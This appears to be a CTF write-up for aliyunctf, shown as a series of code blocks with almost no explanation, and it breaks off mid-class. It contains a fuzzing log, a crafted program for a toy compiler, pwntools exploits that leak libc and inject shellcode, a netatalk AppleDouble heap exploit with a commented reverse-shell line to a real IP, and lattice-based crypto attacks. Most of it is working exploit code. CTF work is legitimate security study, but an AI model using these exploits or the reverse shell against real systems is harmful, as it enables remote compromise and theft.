klang/src/build via △ v3.28.3 ❯ echo $?           0
klang/src/build via △ v3.28.3 ❯ afl-fuzz -i ./in_dir -o ./out_dir -- ./compiler/klang @@              afl-fuzz++4.08c based on afl by Michal Zalewski and a large online community[+] AFL++ is maintained by Marc "van Hauser" Heuse, Dominik Maier, Andrea Fioraldi and Heiko "hexcoder" Eißfeldt[+] AFL++ is open source, get it at https://github.com/AFLplusplus/AFLplusplus[+] NOTE: AFL++ >= v3 has changed defaults and behaviours - see README.md[+] Enabled environment variable ASAN_OPTIONS with value detect_leaks=0,abort_on_error=1,symbolize=0[+] No -M/-S set, autoconfiguring for "-S default"[*] Getting to work...[+] Using exponential power schedule (FAST)[+] Enabled testcache with 50 MB[+] Generating fuzz data with a length of min=1 max=1048576[*] Checking core_pattern...[*] Checking CPU scaling governor...[+] You have 20 CPU cores and 3 runnable tasks (utilization: 15%).[+] Try parallel jobs - see /usr/share/doc/aflplusplus-4.08c-r1/fuzzing_in_depth.md#c-using-multiple-cores[*] Setting up output directories...[+] Output directory exists but deemed OK to reuse.[*] Deleting old session data...[+] Output dir cleanup successful.[*] Checking CPU core loadout...[+] Found a free CPU core, try binding to #0.[*] Scanning './in_dir'...[+] Loaded a total of 1 seeds.[*] Creating hard links for all input files...[*] Validating target binary...[*] Spinning up the fork server...[+] All right - fork server is up.[*] Target map size: 11357[*] No auto-generated dictionary tokens to reuse.[*] Attempting dry run with 'id:000000,time:0,execs:0,orig:a'...
[-] Oops, the program crashed with one of the test cases provided. There are    several possible explanations:
    - The test case causes known crashes under normal working conditions. If      so, please remove it. The fuzzer should be seeded with interesting      inputs - but not ones that cause an outright crash.
    - In QEMU persistent mode the selected address(es) for the loop are not      properly cleaning up variables and memory. Try adding      AFL_QEMU_PERSISTENT_GPR=1 or select better addresses in the binary.
    - Least likely, there is a horrible bug in the fuzzer. If other options      fail, poke the Awesome Fuzzing Discord for troubleshooting tips.[!] WARNING: Test case 'id:000000,time:0,execs:0,orig:a' results in a crash, skipping[+] All test cases processed.
[-] PROGRAM ABORT : We need at least one valid input seed that does not crash!         Location : main(), src/afl-fuzz.c:2388
```



```
ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i ./fuzz/in -o ./fuzz/out ./src/build/compiler/klang @@
```



```
function tester() : int a, string s -> void {    printi(a);    prints(s);    s := "Hello World!";    prints(s);    return;}
function main() : -> int {    tester();    return 0;}
```



```
Allocatables[] = { RCX, R8, R9, R10, R11, RSI, RDI };
```



```
function get_int(int i) : -> int {    return i;}
function arb_read() : string s1 -> void {    prints(s1);    s1 := "A";    prints(s1);    return;}
function do_leak() : int s1, int addr -> void {    prints("addr2leak:");    addr := inputi();    prints("arb_read:");    s1 := get_int(addr);    arb_read();    return;}
function write_gadget(int data) : array a1 -> void {    a1[0] := data;    a1 := array_new(1); /* do not opt me !*/    return;}
function arb_write(int fa, int data) : int a1 -> void {    a1 := fa;    write_gadget(data);    printi(a1);    return;}
function do_write() : array a1, int dp, int wp, int wd -> void {    prints("array_leak:");    a1 := array_new(0x10);    arb_read();    prints("dp:");    dp := inputi();    prints("wp:");    wp := inputi();    prints("wd:");    wd := inputi();    a1[0] := wp;    a1[1] := 1;    arb_write(dp, wd);    return;}
function main() : int t, int i -> int {    do_leak();    do_leak();    i := 12;    do {        do_write();        i := i -1;    }    while (i >= 0);    do_write();    prints("trigger");    return 0;}
```



```
from pwn import *
#p = process("./out", env={"LD_PRELOAD":"./libc-2.31.so"})p = process("./out")context.log_level = "debug"context.arch = "amd64"elf = ELF("./out")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elb_base = 0x400000puts_got = 0x404018
def arb_write(addr, data):    # leak data_ptr    p.recvuntil(b"array_leak:n")    data_ptr = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("data_ptr:", hex(data_ptr))    p.recvuntil(b"dp:n")    p.sendline(str(data_ptr).encode())    # arb_write test    p.recvuntil(b"wp:n")    p.sendline(str(addr).encode())    p.recvuntil(b"wd:n")    p.sendline(str(data).encode())
def exp():    #gdb.attach(p, "b *0x4012c4ncn")    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(puts_got).encode())    p.recvuntil(b"arb_read:n")    puts = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("puts:", hex(puts))    libc_base = puts - libc.symbols["puts"]    print("libc_base:", hex(libc_base))    environ = libc_base + libc.symbols["environ"]    print("environ:", hex(environ))    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(environ).encode())    p.recvuntil(b"arb_read:n")    stack_leak = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("stack_leak:", hex(stack_leak))
    # write shellcode to stack    shellcode = asm(shellcraft.sh())    # ajust shellcode to 4 bytes align    shellcode = shellcode.ljust((len(shellcode) + 3) & ~3, b"x90")    print("shellcode len:", hex(len(shellcode)))    for i in range(len(shellcode)//4):        arb_write(stack_leak + i*4, u32(shellcode[i*4:i*4+4]))        print("write done:", i)
    # hijack puts    arb_write(puts_got, stack_leak)    
    gdb.attach(p)    p.interactive()
if __name__ == "__main__":    exp()
```



```
function get_int(int i) : -> int {    return i;}function arb_read() : string s1 -> void {    prints(s1);    s1 := "A";    prints(s1);    return;}function do_leak() : int s1, int addr -> void {    prints("addr2leak:");    addr := inputi();    prints("arb_read:");    s1 := get_int(addr);    arb_read();    return;}function write_gadget(int data) : array a1 -> void {    a1[0] := data;    a1 := array_new(1); /* do not opt me !*/    return;}function arb_write(int fa, int data) : int a1 -> void {    a1 := fa;    write_gadget(data);    printi(a1);    return;}function do_write() : array a1, int dp, int wp, int wd -> void {    prints("array_leak:");    a1 := array_new(0x10);    arb_read();    prints("dp:");    dp := inputi();    prints("wp:");    wp := inputi();    prints("wd:");    wd := inputi();    a1[0] := wp;    a1[1] := 1;    arb_write(dp, wd);    return;}function main() : int t, int i -> int {    do_leak();    do_leak();    i := 12;    do {        do_write();        i := i -1;    }    while (i >= 0);    do_write();    prints("trigger");    return 0;}END_OF_SNIPPET
```



```
from pwn import *import hashlib, string, struct, sys
#p = process("./out", env={"LD_PRELOAD":"./libc-2.31.so"})p = remote("pwn2.aliyunctf.com", 9999)#p = process("./out")context.log_level = "debug"context.arch = "amd64"#elf = ELF("./out")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elb_base = 0x400000puts_got = 0x404018
def solve_pow(chal, n):  r = 0  while True:    s = chal + struct.pack("<Q", r)    h = int(hashlib.sha256(s).hexdigest(), 16)    if h % (2 ** n) == 0:      break    r += 1  return r
def arb_write(addr, data):    # leak data_ptr    p.recvuntil(b"array_leak:n")    data_ptr = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("data_ptr:", hex(data_ptr))    p.recvuntil(b"dp:n")    p.sendline(str(data_ptr).encode())    # arb_write test    p.recvuntil(b"wp:n")    p.sendline(str(addr).encode())    p.recvuntil(b"wd:n")    p.sendline(str(data).encode())
def exp():    p.recvuntil(b"Give me your team token.n")    p.sendline(b"SuSarzbhSn2LApDv8+1V3Q==")    p.recvuntil(b"./pow_solver.py ")    chal = p.recvuntil(b" ", drop=True)    n = int(p.recvuntil(b" ", drop=True).decode())    print(F"POW({chal.decode()}, {n})")    pow_res = solve_pow(chal, n)    print("pow_res:", pow_res)    p.sendline(str(pow_res).encode())
    p.recvuntil(b"(excluding quote).n")    with open("exp.k", "rb") as f:        p.sendline(f.read())
    pause(1)
    #gdb.attach(p, "b *0x4012c4ncn")    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(puts_got).encode())    p.recvuntil(b"arb_read:n")    puts = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("puts:", hex(puts))    libc_base = puts - libc.symbols["puts"]    print("libc_base:", hex(libc_base))    environ = libc_base + libc.symbols["environ"]    print("environ:", hex(environ))    # leak libc    p.recvuntil(b"addr2leak:n")    p.sendline(str(environ).encode())    p.recvuntil(b"arb_read:n")    stack_leak = u64(p.recvuntil(b"n", drop=True).ljust(8, b"x00"))    print("stack_leak:", hex(stack_leak))
    # write shellcode to stack    shellcode = asm(shellcraft.sh())    # ajust shellcode to 4 bytes align    shellcode = shellcode.ljust((len(shellcode) + 3) & ~3, b"x90")    print("shellcode len:", hex(len(shellcode)))    for i in range(len(shellcode)//4):        arb_write(stack_leak + i*4, u32(shellcode[i*4:i*4+4]))        print("write done:", i)
    # hijack puts    arb_write(puts_got, stack_leak)
    pause(1)
    p.sendline("cat /flag")    
    #gdb.attach(p)    p.interactive()
if __name__ == "__main__":    exp()
```



```
memcpy(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);
```



```
memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,        map + ad_getentryoff(ad, ADEID_RFORK),        ad_getentrylen(ad, ADEID_RFORK));
```



```
#! /usr/bin/env python3# -*- coding: utf-8 -*-#from pwn import *context(arch = 'i386', os = 'linux', endian='little')context.log_level = 'info'
libc = ELF('libc-2.27.so')ld = ELF('ld-2.27.so')
import socketimport structimport sysimport timefrom afputils import *
# Helper function to create AppleDouble metadata header# you can modify the header as you want...def createAppleDouble_leak():  header = p32(0x51607)                     #Magic number double  header += p32(0x20000)                    #Version number  header += p8(0) * 16                      #Filler  header += p16(2)                          #Number of entries  header += p32(9)                          #Entry Id Finder Info  header += pack(0x7fa, 32, 'big', True)         # offset  header += p32(30)                         # Set length other than 32 to call 'ad_convert_osx'  header += p32(2)                          # Type Ressource fork  header += p32(0x100)                      # #Control the mmap size  header += p32(0)                          # length  ############  # usefull to find adouble offset  ###########  header += b'abcdefghijklmnopqrstuvwzxy1234567890'  return header
def createAppleDouble_write(system):  header = p32(0x51607)                     #Magic number double  header += p32(0x20000)                    #Version number  header += p8(0) * 16                      #Filler  header += p16(2)                          #Number of entries  header += p32(9)                          #Entry Id Finder Info  header += pack(0x4504, 32, 'big', True)         # offset  header += p32(30)                         # Set length other than 32 to call 'ad_convert_osx'  header += p32(2)                          # Type Ressource fork  header += p32(0x32)                      # #Control the mmap size  header += p32(0x32c + 8)                          # length  ############  # usefull to find adouble offset  ###########  # header += b'bash -i >& /dev/tcp/107.173.159.203/8000 0>&1x00'.ljust(0x32c) + p32(system, endian='little')  header += b'cat /flag.txt > /home/xxxx/shared/flagx00'.ljust(0x32c) + p32(system, endian='little')  return header
# ip and port of the local netatalk serverip = "127.0.0.1"port = 5548volume = "Shared"
p = connect(ip, port)response, request_id = DSIOpenSession(p, debug)response, request_id = FPLogin(p, request_id, b'AFP3.3', b'No User Authent', None, debug)response, request_id, volume_id = FPOpenVol(p, request_id, 0x21, bytes(volume,encoding='utf-8'), None, debug)
# rm fileresponse, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"test_file")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"test_file_2")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"._test_file")response, request_id = FPDelete(p, request_id, volume_id, 2, 2, b"._test_file_2")
# create an appledouble metadata headerappledouble = createAppleDouble_leak()# create an appledouble metadata file for "test_file"response, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"._test_file", debug)response, request_id, fork2 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"._test_file", debug)response, request_id = FPWriteExt(p, request_id, fork2, 0, len(appledouble), appledouble, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork2, debug)
# create a simple file named "test_file" with data insideresponse, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"test_file", debug)response, request_id, fork1 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"test_file", debug)
data = b'Hello World !'
# write data into the fileresponse, request_id = FPWriteExt(p, request_id, fork1, 0, len(data), data, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork1, debug)
# leakresponse, request_id, fork3 = FPOpenFork(p, request_id, 2, volume_id, 2, 0, 3, 2, b"test_file", debug)response, request_id = FPReadExt(p, request_id, fork2, 0x32, 4, debug)libc.address = u32(response[0x10:], endian = 'little') - 0x170e7print(hex(libc.address))# response, request_id = FPCloseFork(p, request_id, fork3, debug)
# create an appledouble metadata headerappledouble = createAppleDouble_write(libc.sym.system)# create an appledouble metadata file for "test_file"response, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"._test_file_2", debug)response, request_id, fork2 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"._test_file_2", debug)response, request_id = FPWriteExt(p, request_id, fork2, 0, len(appledouble), appledouble, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork2, debug)
# create a simple file named "test_file" with data insideresponse, request_id = FPCreateFile(p, request_id, volume_id, 2, 2, b"test_file_2", debug)response, request_id, fork1 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"test_file_2", debug)
data = b'Hello World !'
# write data into the fileresponse, request_id = FPWriteExt(p, request_id, fork1, 0, len(data), data, debug)# close file# response, request_id = FPCloseFork(p, request_id, fork1, debug)
# triggertry:  response, request_id, fork3 = FPOpenFork(p, request_id, 2, volume_id, 2, 0, 3, 2, b"test_file_2", debug)except Exception as e:  pass
DSICloseSession(p, request_id, debug)
p.close()
p = connect(ip, port)response, request_id = DSIOpenSession(p, debug)response, request_id = FPLogin(p, request_id, b'AFP3.3', b'No User Authent', None, debug)response, request_id, volume_id = FPOpenVol(p, request_id, 0x21, bytes(volume,encoding='utf-8'), None, debug)
response, request_id, fork4 = FPOpenFork(p, request_id, 0, volume_id, 2, 0, 3, 2, b"flag", debug)response, request_id = FPReadExt(p, request_id, fork4, 0, 0x100, debug)print(response[0x10:])
DSICloseSession(p, request_id, debug)p.close()
```



```
#final exp
from sage.all import *from Crypto.Cipher import AESfrom ecdsa import NIST256pfrom ecdsa.ecdsa import Public_keyfrom ecdsa.ellipticcurve import Pointfrom hashlib import sha256from os import urandomfrom random import seed, choice, randrangefrom signal import signal, alarm, SIGALRMfrom string import ascii_letters, ascii_lowercase, digitsfrom sys import stdinfrom pwn import *

E = NIST256p.curvem = 2**211p=int(E.p())Fp=GF(p)El=EllipticCurve(GF(p),[E.a(),E.b()])
def proof(r):    text=r.recvline()    print(text)    tmp=text.split(b'XXXX + ')[-1]    suf,val=tmp.strip().split(b') == ')    suf=suf.decode()    val=val.decode()    poss=ascii_letters + digits    for a in poss:        for b in poss:            for c in poss:                for d in poss:                    digest = sha256((a+b+c+d+suf).encode()).hexdigest()                    if(digest==val):                        r.sendline((a+b+c+d).encode())                        return
def get_Ax_Bx_encsign(r):    text=r.recvuntil(b'Now, it is your turn:')    print(text.decode())    text=text.split(b'Hi, Bob! Here is my public key: ')[-1]    Ax,text=text.split(b'nHi, Alice! Here is my public key: ')    Bx,enc_sign=text.split(b'n')[:2]    print(Ax,Bx,enc_sign)    return int(Ax.decode(),16),int(Bx.decode(),16),bytes.fromhex(enc_sign.decode())
def send_point(r,P):    px,py=P[0],P[1]    print(hex(px))    r.sendline(hex(px)[2:].encode())    r.sendline(hex(py)[2:].encode())    def get_leak(r):    text=r.recvuntil(b'Leak: ')    text=r.recv()    print(text)    lx,ly=text.split(b', ')    return int(lx.decode(),16),int(ly.decode(),16)    r=remote("crypto0.aliyunctf.com","12346")proof(r)Ax,Bx,enc_sign=get_Ax_Bx_encsign(r)print(enc_sign.hex())send_point(r,El.lift_x(Fp(Bx)))low_x,low_y=get_leak(r)
from re import findallfrom subprocess import check_output
def flatter(M):    # compile https://github.com/keeganryan/flatter and put it in $PATH    z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]"    ret = check_output(["flatter"], input=z.encode())    return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))
def find_root(p, f, bounds, m, t):    # print(bounds)    f /= f.coefficients().pop(0)    # print(f)    f = f.change_ring(ZZ)    pr=f.parent()    x,y=pr.gens()        G = Sequence([], f.parent())    for k in range(m+1):        g=f**k*p**(m-k)        for j in range(2*(m-k)+t+1):            G.append(g*y**j)        for i in range(2):            g*=x            for j in range(2*(m-k)+t-1):                G.append(g*y**j)        B, monomials = G.coefficient_matrix()    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    B = flatter(B.dense_matrix())    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1/factor)
    H = Sequence([], f.parent().change_ring(QQ))    for h in filter(None, B*monomials):        H.append(h)    return H
R.<x,y>=PolynomialRing(Fp)x,y=R.gens()B=p//m//2f=((y+B)*m+low_y)^2-((x+B)*m+low_x)^3-int(E.a())*((x+B)*m+low_x)-int(E.b())indexx = 10mypols = find_root(p,f,[B,B],6,1)[:indexx]
def find_prime_root(pp, idx):    root = []    PRs = PolynomialRing(GF(pp), 2,'a,b', order='lex')    a,b = PRs.gens()    mynew_pol = []    for i in mypols:        mynew_pol.append(PRs(i))    I1 = ideal(mynew_pol)    GB = I1.groebner_basis()    res = GB[-1].univariate_polynomial().roots()    if len(res) == 1:        ans = int(res[0][0])        root.append(ans)    else:        return []    res = GB[-2](b=root[0]).univariate_polynomial().roots()    if len(res) == 1:        ans = int(res[0][0])        root.append(ans)    else:        return []    root.append(pp)    sec[idx] = root
base = primes_first_n(30)[3:]sec = [0]*len(base)threads = []for i in range(len(base)):    find_prime_root(base[i], i)xi = []yi = []pp = []for root in sec:    if root:        yi.append(root[0])        xi.append(root[1])        pp.append(root[2])
xx,yy=crt(xi,pp),crt(yi,pp)P=product(pp)
def find_real(xx,yy,f):    if(f(xx,yy)==0):        return xx,yy    if(f(xx-P,yy)==0):        return xx-P,yy    if(f(xx,yy-P)==0):        return xx,yy-P    if(f(xx-P,yy-P)==0):        return xx-P,yy-Preal_x,real_y=find_real(xx,yy,f)shared_AB=(real_x+B)*m+low_x,(real_y+B)*m+low_yprint(shared_AB)
key = sha256(str(shared_AB).encode()).digest()sign=AES.new(key,AES.MODE_ECB).decrypt(enc_sign).split(b'Secret sign is ')[-1]r.sendline(AES.new(key,AES.MODE_ECB).encrypt(sign[:-1]).hex().encode())print(r.recvall())
# aliyunctf{Coppersmith_in_the_wild!}
```



```
#final exp
from sage.all import *from Crypto.Cipher import AESfrom ecdsa import NIST256pfrom ecdsa.ecdsa import Public_keyfrom ecdsa.ellipticcurve import Pointfrom hashlib import sha256from os import urandomfrom random import seed, choice, randrangefrom signal import signal, alarm, SIGALRMfrom string import ascii_letters, ascii_lowercase, digitsfrom sys import stdinfrom pwn import *from re import findallfrom subprocess import check_output
E = NIST256p.curvem = 2**164p=int(E.p())Fp=GF(p)El=EllipticCurve(GF(p),[E.a(),E.b()])
def proof(r):    text=r.recvline()    print(text)    tmp=text.split(b'XXXX + ')[-1]    suf,val=tmp.strip().split(b') == ')    suf=suf.decode()    val=val.decode()    poss=ascii_letters + digits    for a in poss:        for b in poss:            for c in poss:                for d in poss:                    digest = sha256((a+b+c+d+suf).encode()).hexdigest()                    if(digest==val):                        r.sendline((a+b+c+d).encode())                        return
def get_Ax_Bx_encsign(r):    text=r.recvuntil(b'Now, it is your turn:')    # print(text.decode())    text=text.split(b'Hi, Bob! Here is my public key: ')[-1]    Ax,text=text.split(b'nHi, Alice! Here is my public key: ')    Bx,enc_sign=text.split(b'n')[:2]    return int(Ax.decode(),16),int(Bx.decode(),16),bytes.fromhex(enc_sign.decode())
def send_point(r,P):    px,py=P[0],P[1]    r.sendline(hex(px)[2:].encode())    r.sendline(hex(py)[2:].encode())    text=r.recvuntil(b'Leak: ')    print(text)    text=r.recvline().strip()    print(text)    return int(text.decode(),16)
E = NIST256p.curveG = NIST256p.generatorm = 2**164n = G.order()Fp=GF(p)a=int(E.a())b=int(E.b())El=EllipticCurve(GF(p),[a,b])
def flatter(M):    # compile https://github.com/keeganryan/flatter and put it in $PATH    z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]"    ret = check_output(["flatter"], input=z.encode())    return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))
a=int(E.a())b=int(E.b())p=int(E.p())PR = PolynomialRing(Zmod(p),'e',6)es = PR.gens()e0,e1,e2,e3,e4,e5 = esmmm = mB=p//mmmB0=B//2leak0 = send_point(r,pk_B+0*pk_G)gabx = leak0 + mmm * (e0+B0)
leak1 = send_point(r,pk_B+1*pk_G)leak_1= send_point(r,pk_B-1*pk_G)leak1_= int(leak1)+int(leak_1)Q1x   = int((pk_A * 1)[0])left1 = (leak1_ + mmm*(e1+B)) * (gabx - Q1x)**2right1= 2*(a*(gabx+Q1x)+2*b+Q1x*gabx*(Q1x+gabx))F1    = left1 - right1F1   *= int(inverse_mod(F1.coefficients()[0],p))
leak2 = send_point(r,pk_B+2*pk_G) leak_2= send_point(r,pk_B-2*pk_G) # DH(Alice_sk, -2*G + Bob_pk) % m leak2_= int(leak2)+int(leak_2)Q2x   = int((pk_A * 2)[0])left2 = (leak2_ + mmm*(e2+B)) * (gabx - Q2x)**2right2= 2*(a*(gabx+Q2x)+2*b+Q2x*gabx*(Q2x+gabx))F2    = left2 - right2F2   *= int(inverse_mod(F2.coefficients()[0],p))
leak3 = send_point(r,pk_B+3*pk_G)#  % m leak_3 = send_point(r,pk_B-3*pk_G) #DH(Alice_sk, -3*G + Bob_pk) % m leak3_= int(leak3)+int(leak_3)Q3x   = int((pk_A * 3)[0])left3 = (leak3_ + mmm*(e3+B)) * (gabx - Q3x)**2right3= 2*(a*(gabx+Q3x)+2*b+Q3x*gabx*(Q3x+gabx))F3    = left3 - right3F3   *= int(inverse_mod(F3.coefficients()[0],p))
leak4 = send_point(r,pk_B+4*pk_G) % m leak_4 = send_point(r, pk_B-4*pk_G) % m leak4_= int(leak4)+int(leak_4)Q4x   = int((pk_A * 4)[0])left4 = (leak4_ + mmm*(e4+B)) * (gabx - Q4x)**2right4= 2*(a*(gabx+Q4x)+2*b+Q4x*gabx*(Q4x+gabx))F4    = left4 - right4F4   *= int(inverse_mod(F4.coefficients()[0],p))
leak5 = send_point(r,pk_B+5*pk_G) #% m leak_5 = send_point(r,pk_B-5*pk_G) #ice_sk, -5*G + Bob_pk) % m leak5_= int(leak5)+int(leak_5)Q5x   = int((pk_A * 5)[0])left5 = (leak5_ + mmm*(e5+B)) * (gabx - Q5x)**2right5= 2*(a*(gabx+Q5x)+2*b+Q5x*gabx*(Q5x+gabx))F5    = left5 - right5F5   *= int(inverse_mod(F5.coefficients()[0],p))
#(n,d,t)=(5,2,1)#(n,d,t)=(5,3,2)#(n,d,t)=(5,3,2)def find_root(p,n,d,t,polys,bounds):    A,B,C,D,E=[],[],[],[],[]    for i in range(n):        polys[i]=polys[i].change_ring(ZZ)        __,cc,ee,bb,dd,aa=polys[i].coefficients()        A.append(aa)        B.append(bb)        C.append(cc)        D.append(dd)        E.append(ee)        R=polys[0].parent()    x=R.gens()        G = Sequence([],R)        # case l=0    for i in range(2*d):        G.append(p**d*x[0]**i)        # case l=1    for i in range(1,n+1):        G.append(p**d*x[i])        G.append(p**d*x[0]*x[i])        # case l=1    for i in range(0,n):        for j in range(2,2*d):            G.append(p**(d-1)*x[0]**(j-2)*polys[i]%(p**d))
    # case 1<l<=d    def work(choose):        l=len(choose)        RR=PolynomialRing(Zmod(p**(l-1)),1,'xx')        xx=RR.gen()        polys_l=[]        for i in choose:            polys_l.append(xx**2+E[i]*xx+D[i])        M=matrix(Zmod(p**(l-1)),2*l)        for i in range(l):            tmp=RR(1)            for j in range(l):                if(i!=j):                    tmp*=polys_l[j]            # print(tmp)            # print(tmp.coefficients())            tmp=tmp.coefficients()[::-1]            M[i]=tmp+[0]            M[i+l]=[0]+tmp        # print(M)        W=M.inverse()        w=W.change_ring(ZZ)        for i0 in range(2*l):            tmp=0            for (u,ui) in enumerate(choose):                tp=x[ui+1]                for vi in choose:                    if(vi!=ui):                        tp*=polys[vi]                tmp+=(w[i0,u]+w[i0,u+l]*x[0])*tp            G.append(p**(d-l+1)*tmp%(p**d))        tp=1        for i in choose:            tp*=polys[i]        for i0 in range(2*l,2*d):            G.append(p**(d-l)*tp*x[0]**(i0-2*l)%(p**d))
    #case l=d+1    def spec(choose):        l=len(choose)        RR=PolynomialRing(Zmod(p**(l-1)),1,"xx")        xx=RR.gen()        polys_l=[]        for i in choose:            polys_l.append(xx**2+E[i]*xx+D[i])        M=matrix(Zmod(p**(l-1)),2*l)        for i in range(l):            tmp=RR(1)            for j in range(l):                if(i!=j):                    tmp*=polys_l[j]            tmp=tmp.coefficients()[::-1]            M[i]=tmp+[0]            M[i+l]=[0]+tmp        W=M.inverse()        w=W.change_ring(ZZ)        for i0 in range(0,t+1):            H=0            for (u,ui) in enumerate(choose):                th=x[ui+1]                for vi in choose:                    if(vi!=ui):                        th*=polys[vi]                H+=(w[i0,u]+w[i0,u+l]*x[0])*th            J=0            for (u,ui) in enumerate(choose):                tj=C[ui]                for vi in choose:                    if(vi!=ui):                        tj*=polys[vi]                J+=(w[i0,u]+w[i0,u+l]*x[0])*tj            K=0            for (u,ui) in enumerate(choose):                tk=B[ui]-C[ui]*E[ui]                for vi in choose:                    if(vi!=ui):                        tk*=polys[vi]                K+=w[i0,u+l]*tk            # print((H+J+K)%(p**d))            G.append((H+J+K)%(p**d))
    def dfs(i,l,choose):        if(i==n):            if(l==0):                if(len(choose)<=d):                    work(choose)                else:                    spec(choose)            return        if(l>0):            dfs(i+1,l-1,choose+[i])        dfs(i+1,l,choose)                for l in range(2,d+2):        dfs(0,l,[])
    B, monomials = G.coefficient_matrix()    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    # B=B.dense_matrix().LLL()    B = flatter(B.dense_matrix())    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1/factor)    print(polys[0].parent())    H = Sequence([], polys[0].parent().change_ring(QQ))    for h in filter(None, B*monomials):        H.append(h)    return H
F1 = F1.change_ring(ZZ)F2 = F2.change_ring(ZZ)F3 = F3.change_ring(ZZ)F4 = F4.change_ring(ZZ)F5 = F5.change_ring(ZZ)
polys = [F1,F2,F3,F4,F5]bounds = [B0] + [B for _ in range(5)]
n,d,t = 5,3,2ret = find_root(p,n,d,t,polys,bounds)mypol = []for poli in ret:    mypol.append(poli)print(len(mypol))def find_roots_CRT(R,Hs,bounds):    if bounds == None:        print("[-] CRT-find_roots need bounds")        return []    P = 2    M = 1
    ALERT = True    vars = R.gens()    k = len(vars)    Hs = [h.change_ring(ZZ) for h in Hs]    maxBound = max(bounds)*4    remainders = [[] for _ in range(k)]    modulus = []    times = 0    Maxtimes = 100
    while M < maxBound and times < Maxtimes:        P = next_prime(P)        R = R.change_ring(GF(P))        solutions = []        for i in range(len(Hs),0,-1):            I = R * (Hs[:i])            I = Ideal(I.groebner_basis())            if I.dimension() == 0:                solutions = I.variety()                if len(solutions) != 0:                    if len(solutions) > 1:                        if ALERT:                            ALERT = False                            print("[!] Find more than one roots! The result may goes wrong. ")                    else:                        solutions = [int(solutions[0][var]) for var in vars ]                        for remainder,solution in zip(remainders,solutions):                            remainder.append(solution)                        modulus.append(P)                        M *= P                        break
        if solutions == []:            times += 1    if times != Maxtimes:        return list(set(tuple(int(crt(remainders[i], modulus)) for i in range(k)))),M    else:        return []print("START my_ret")ret,M=find_roots_CRT(mypol[0].parent(),mypol[:36],bounds)
for i in range(len(ret)):    if(ret[i]>abs(ret[i]-M)):        ret[i]-=M
for e0 in ret:    e0=(e0+B0)*m+leak0    key = sha256(str(e0).encode()).digest()    sign=AES.new(key,AES.MODE_ECB).decrypt(enc_sign)    if(sign.startswith(b'Secret sign is ')):        sign=sign.split(b'Secret sign is ')[-1]        r.sendline(AES.new(key,AES.MODE_ECB).encrypt(sign[:-1]).hex().encode())        print(r.recvall())        # aliyunctf{ECHNP_is_not_as_difficult_as_I_thought}
```



```
import os, sysfrom sage.crypto.sbox import SBoxclass TAES_Oracle:    rounds = 10    keysize = 10
